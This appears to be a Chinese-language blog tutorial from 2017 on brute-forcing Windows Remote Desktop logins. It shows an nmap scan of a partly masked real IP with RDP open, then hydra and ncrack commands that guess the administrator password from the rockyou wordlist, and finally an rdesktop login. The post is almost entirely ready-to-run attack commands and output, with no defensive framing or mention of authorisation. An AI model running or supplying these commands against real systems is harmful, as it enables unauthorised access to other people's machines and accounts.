---
title: "暴力破解Windows RDP(3389)"
categories: [ "安全" ]
tags: [ "密码安全" ]
draft: false
slug: "暴力破解Windows RDP(3389)-暴力破解windowsrdp3389"
date: "2017-04-08 07:32:16"
---



RDP是远程桌面协议。

    $ nmap your_target
    Starting Nmap 7.01 ( https://nmap.org ) at 2016-09-20 17:29 CST
    Nmap scan report for ns514636.ip-192-95-xx.net (192.95.xx.xx)
    Host is up (0.28s latency).
    Not shown: 988 closed ports
    PORT      STATE    SERVICE
    135/tcp   filtered msrpc
    139/tcp   filtered netbios-ssn
    445/tcp   filtered microsoft-ds
    593/tcp   filtered http-rpc-epmap
    3389/tcp  open     ms-wbt-server   # 这个是远程桌面端口
    4444/tcp  filtered krb524
    6667/tcp  filtered irc
    49152/tcp open     unknown
    49153/tcp open     unknown
    49154/tcp open     unknown
    49155/tcp open     unknown
    49163/tcp open     unknown
    Nmap done: 1 IP address (1 host up) scanned in 28.14 seconds

## 使用hydra暴力破解：

    hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://your_target

    -t = TASKS run TASKS number of connects in parallel (per host, default: 16) RDP set to maximum of 4.
    -V = Verbose shows you the attempted passwords.
    -l = Username
    -P = Password list
    rdp:// = Port 3389

## 使用ncrack暴力破解：

    ncrack -p 3389 -v -user administrator -P /usr/share/wordlists/rockyou.txt 192.95.xx.xx

    -p = Port number
    -v = Verbose shows you any found passwords in realtime
    -user = username
    -P = Password list

## 远程桌面登录：

    rdesktop your_target